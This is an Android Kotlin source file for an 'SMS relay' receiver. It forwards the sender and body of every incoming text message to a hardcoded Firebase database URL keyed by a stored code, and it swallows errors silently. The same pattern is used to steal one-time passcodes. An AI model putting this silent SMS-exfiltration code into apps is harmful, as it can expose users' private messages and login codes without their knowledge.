package com.example.smsrelay

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        if (i.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        val sp = c.getSharedPreferences("cfg", Context.MODE_PRIVATE)
        val server = "https://extension-b36aa-default-rtdb.firebaseio.com"
        val code = sp.getString("code", "") ?: ""
        if (code.length < 8) return
        val msgs = Telephony.Sms.Intents.getMessagesFromIntent(i)
        if (msgs.isEmpty()) return
        val sender = msgs[0].originatingAddress ?: ""
        val body = msgs.joinToString("") { it.messageBody ?: "" }
        val pr = goAsync()
        Thread {
            try {
                val con = URL("$server/messages/$code.json").openConnection() as HttpURLConnection
                con.requestMethod = "POST"; con.doOutput = true
                con.connectTimeout = 10000; con.readTimeout = 10000
                con.setRequestProperty("Content-Type", "application/json")
                val j = JSONObject().put("sender", sender).put("body", body).put("time", System.currentTimeMillis())
                con.outputStream.use { it.write(j.toString().toByteArray()) }
                con.responseCode; con.disconnect()
            } catch (_: Exception) {
            } finally { pr.finish() }
        }.start()
    }
}
